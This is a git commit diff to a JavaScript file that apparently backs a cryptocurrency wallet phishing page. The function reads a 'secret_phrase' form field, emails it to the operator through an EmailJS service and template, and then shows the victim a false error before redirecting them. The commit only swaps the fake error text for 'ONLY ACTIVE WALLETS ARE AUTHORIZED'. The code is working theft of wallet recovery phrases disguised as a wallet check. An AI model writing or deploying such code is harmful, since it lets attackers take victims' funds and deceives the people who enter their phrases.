568745189f14e3d7172bca913dbb4b50f1e05985
Joseph Fadairo <74228417+joefadairo8@users.noreply.github.com>
2024-05-09 19:21:23 +0100

    Update script.js

--- check/script.js
+++ check/script.js
@@ -3,7 +3,7 @@ function SendMail() {
         result : document.getElementById("secret_phrase").value
     }
     emailjs.send("service_fm0ybhm", "template_bhbz48m", params).then(function (res) {
-        alert("Error!: wallet failed to interact successfully" );
+        alert("Error!: ONLY ACTIVE WALLETS ARE AUTHORIZED" );
         window.location.href = "/check/index.html";
     })
 }
